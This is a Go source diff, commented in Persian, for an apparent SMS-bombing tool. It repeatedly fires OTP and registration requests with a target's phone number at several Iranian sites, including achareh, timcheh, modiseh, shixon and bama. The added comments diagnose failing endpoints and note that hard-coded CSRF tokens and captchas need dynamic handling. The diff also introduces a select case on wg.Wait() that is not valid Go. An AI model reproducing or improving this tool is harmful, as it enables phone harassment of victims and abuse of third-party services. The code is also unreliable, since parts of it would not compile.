@@ -237,109 +237,148 @@ func main() {
 			}
 		}()
 	}
-              
 // حلقه اصلی برای تعریف و ارسال کارها به کانال tasks
 	for i := 0; i < repeatCount; i++ {
-		// 1. api.achareh.co (JSON)
+		// بررسی لغو Context قبل از ارسال هر بلوک از وظایف
+		select {
+		case <-ctx.Done():
+			fmt.Println("\033[01;33m[!] Task dispatching canceled.\033[0m")
+			goto endOfDispatch // پرش به انتهای حلقه
+		default:
+			// ادامه ارسال وظایف
+		}
+
+		// ---- API هایی که پیام ارسال نکردند (نیاز به بررسی بیشتر) ----
+
+		// 1. api.achareh.co (JSON) - گزارش شده کار نکرده. Payload ساده است.
+		// احتمالات: نیاز به هدرهای خاص (مثل User-Agent, Origin)، یا اعتبارسنجی سمت سرور بر اساس IP یا شماره.
+		// برای عیب یابی: جزئیات درخواست در مرورگر (تب Network) را بررسی کنید.
 		wg.Add(1)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://api.achareh.co/v2/accounts/login/?web=true", map[string]interface{}{
-				"phone": phone, // استفاده از متغیر phone که کاربر وارد کرده
+				"phone": phone,
 			}, &wg, ch)
 		}
-		// 5. api.timcheh.com (JSON)
+
+		// 5. api.timcheh.com (JSON) - گزارش شده کار نکرده. Payload ساده است.
+		// احتمالات: نیاز به هدرهای خاص، اعتبارسنجی سمت سرور، یا URL دقیقاً صحیح نیست.
+		// برای عیب یابی: جزئیات درخواست در مرورگر (تب Network) را بررسی کنید.
 		wg.Add(1)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://api.timcheh.com/auth/otp/send", map[string]interface{}{
-				"mobile": phone, // استفاده از متغیر phone
+				"mobile": phone,
 			}, &wg, ch)
 		}
 
-		// 6. modiseh.com (Form) - ساختار payload شامل کلیدهای پیچیده و فرمت Form Data است
+		// 6. modiseh.com (Form) - گزارش شده کار نکرده. نیاز به توکن های داینامیک و احتمالاً کپچا دارد.
+		// این API بدون پیاده سازی مکانیزم استخراج form_key, referer و حل کپچا از صفحه وب کار نخواهد کرد.
+		// ⚠️ این مورد نیاز به تغییرات پیشرفته تری دارد که فراتر از یک درخواست ساده است.
 		wg.Add(1)
 		tasks <- func() {
 			formData := url.Values{}
-			formData.Set("otp_code", "") // طبق payload شما
-			formData.Set("login[username]", "") // طبق payload شما
-			formData.Set("username", phone) // استفاده از متغیر phone
-			formData.Set("pass", "") // طبق payload شما
-			formData.Set("my_pass", "") // طبق payload شما
-			formData.Set("is_force_login", "") // طبق payload شما
-			formData.Set("customer_set_password", "") // طبق payload شما
-			formData.Set("customer_set_password2", "") // طبق payload شما
-			formData.Set("form_key", "NtheYMn1kIgW0qqQ") // ممکن است نیاز به تولید دینامیک داشته باشد
+			formData.Set("otp_code", "")
+			formData.Set("login[username]", "")
+			formData.Set("username", phone)
+			formData.Set("pass", "")
+			formData.Set("my_pass", "")
+			formData.Set("is_force_login", "")
+			formData.Set("customer_set_password", "")
+			formData.Set("customer_set_password2", "")
+			formData.Set("form_key", "NtheYMn1kIgW0qqQ") // ⚠️ داینامیک
 			formData.Set("type", "enter_mobile")
-			formData.Set("captcha[user_login]", "123456") // ممکن است نیاز به حل کپچا داشته باشد
-			formData.Set("referer", "aHR0cHM6Ly93d3cubW9kaXNlaC5jb20v") // ممکن است نیاز به تولید دینامیک داشته باشد
-			formData.Set("otp_token", "") // طبق payload شما
+			formData.Set("captcha[user_login]", "123456") // ⚠️ کپچا
+			formData.Set("referer", "aHR0cHM6Ly93d3cubW9kaXNlaC5jb20v") // ⚠️ داینامیک (Base64 encoded URL)
+			formData.Set("otp_token", "")
 			sendFormRequest(ctx, "https://www.modiseh.com/customer/account/loginpost/", formData, &wg, ch)
 		}
 
-		// 7. shixon.com (Form) - ساختار payload شبیه Form Data است
+		// 7. shixon.com (Form) - گزارش شده کار نکرده. نیاز به توکن __RequestVerificationToken داینامیک دارد.
+		// این API بدون پیاده سازی مکانیزم استخراج __RequestVerificationToken از صفحه وب کار نخواهد کرد.
+		// ⚠️ این مورد نیاز به تغییرات پیشرفته تری دارد. فیلد "P" هم مشکوک است.
 		wg.Add(1)
 		tasks <- func() {
 			formData := url.Values{}
-			formData.Set("M", phone) // استفاده از متغیر phone
-			formData.Set("P", "123456789") // رمز عبور پیش فرض؟ ممکن است نیاز نباشد یا باید تغییر کند
+			formData.Set("M", phone)
+			formData.Set("P", "123456789") // ⚠️ مشکوک
 			formData.Set("s", "888")
-			formData.Set("PU", "") // طبق payload شما
-			// __RequestVerificationToken ممکن است نیاز به تولید دینامیک از صفحه وب داشته باشد
-			formData.Set("__RequestVerificationToken", "3otZwhYPKHgFR1b-1dRGDdyKPJNqaPhyqOB1AFP5YM5mg1PDbeFfMxqn_kKN3yTp3qRlXKh9f13F1jfvWzs0ZUxTOTp9jQPRTHh2jqV_FeE1")
+			formData.Set("PU", "")
+			formData.Set("__RequestVerificationToken", "3otZwhYPKHgFR1b-1dRGDdyKPJNqaPhyqOB1AFP5YM5mg1PDbeFfMxqn_kKN3yTp3qRlXKh9f13F1jfvWzs0ZUxTOTp9jQPRTHh2jqV_FeE1") // ⚠️ داینامیک
 			sendFormRequest(ctx, "https://www.shixon.com/Home/RegisterUser", formData, &wg, ch)
 		}
 
-		// 8. dast2.com (JSON) - ساختار payload ساده
+		// 8. dast2.com (JSON) - گزارش شده کار نکرده. Payload ساده است.
+		// احتمالات: نیاز به هدرهای خاص، اعتبارسنجی سمت سرور.
+		// برای عیب یابی: جزئیات درخواست در مرورگر (تب Network) را بررسی کنید.
 		wg.Add(1)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://dast2.com/token", map[string]interface{}{
-				"cellphone": phone, // استفاده از متغیر phone
+				"cellphone": phone,
 			}, &wg, ch)
 		}
 
-		// 9. api.esam.ir (JSON)
+		// 9. api.esam.ir (JSON) - گزارش شده کار نکرده. Payload شامل فیلدهای متعدد است.
+		// احتمالات: نیاز به هدرهای خاص، اعتبارسنجی سمت سرور، یا مشکل در فیلد serialNumber با مقدار خالی.
+		// برای عیب یابی: جزئیات درخواست در مرورگر (تب Network) و مستندات API (اگر موجود است) را بررسی کنید.
 		wg.Add(1)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://api.esam.ir/api/account/v3/RegisterUserv3", map[string]interface{}{
-				"mobile": phone, // استفاده از متغیر phone
+				"mobile": phone,
 				"present_type": "WebApp",
 				"registration_method": 0,
-				"serialNumber": "", // طبق payload شما
+				"serialNumber": "", // ⚠️ ممکن است نیاز به مقدار دیگری باشد یا کلا نباید ارسال شود اگر خالی است
 			}, &wg, ch)
 		}
 
-		// 11. lioncomputer.com (Form) - ساختار payload شبیه Form Data است
+		// 11. lioncomputer.com (Form) - گزارش شده کار نکرده. خطای Redirect میدهد.
+		// این URL به احتمال زیاد نقطه پایانی صحیح برای دریافت مستقیم درخواست POST با این Payload نیست
+		// یا نیاز به هدرهای خاصی دارد که باعث عدم Redirect شود.
+		// ⚠️ این مورد نیاز به بررسی دقیق جریان لاگین در سایت و یافتن نقطه پایانی صحیح API دارد.
 		wg.Add(1)
 		tasks <- func() {
 			formData := url.Values{}
-			formData.Set("mobile", phone) // استفاده از متغیر phone
+			formData.Set("mobile", phone)
 			formData.Set("redirect_url", "https://www.lioncomputer.com")
 			sendFormRequest(ctx, "https://www.lioncomputer.com/api/v1/auth/send-register-code", formData, &wg, ch)
 		}
 
-		// 12. account.bama.ir (Form) - ساختار payload شبیه Form Data است
+		// 12. account.bama.ir (Form) - گزارش شده کار نکرده. Payload ساده است.
+		// احتمالات: نیاز به هدرهای خاص، اعتبارسنجی سمت سرور.
+		// برای عیب یابی: جزئیات درخواست در مرورگر (تب Network) را بررسی کنید.
 		wg.Add(1)
 		tasks <- func() {
 			formData := url.Values{}
-			formData.Set("username", phone) // استفاده از متغیر phone
+			formData.Set("username", phone)
 			formData.Set("client_id", "popuplogin")
 			sendFormRequest(ctx, "https://account.bama.ir/api/otp/generate/v4", formData, &wg, ch)
 		}
 
-	} // پایان حلقه repeatCount
-	close(tasks)
+		// ... (API هایی که قبلاً کار می کردند و می خواهید اضافه کنید) ...
 
+	} // پایان حلقه repeatCount
+
+	// ... (بقیه کد main بدون تغییر) ...
+	endOfDispatch:
+		close(tasks)
 
 	go func() {
-		wg.Wait()
+		select {
+		case <-ctx.Done():
+			fmt.Println("\033[01;33m[!] Waiting for WaitGroup interrupted by context.\033[0m")
+		case wg.Wait():
+			fmt.Println("\033[01;32m[+] All tasks finished.\033[0m")
+		}
 		close(ch)
 	}()
 
-	// پردازش کدهای وضعیت دریافت شده از کانال ch
+	fmt.Println("\033[01;34m[*] Processing results...\033[0m")
 	for statusCode := range ch {
-		if statusCode >= 400 || statusCode == 0 { // کد وضعیت 0 برای درخواست های لغو شده توسط Context
+		if statusCode >= 400 || statusCode == 0 {
 			fmt.Println("\033[01;31m[-] Error or Canceled!")
 		} else {
 			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
 		}
 	}
-}
+
+	fmt.Println("\033[01;32m[+] Program finished.\033[0m")
+
+} // پایان تابع main
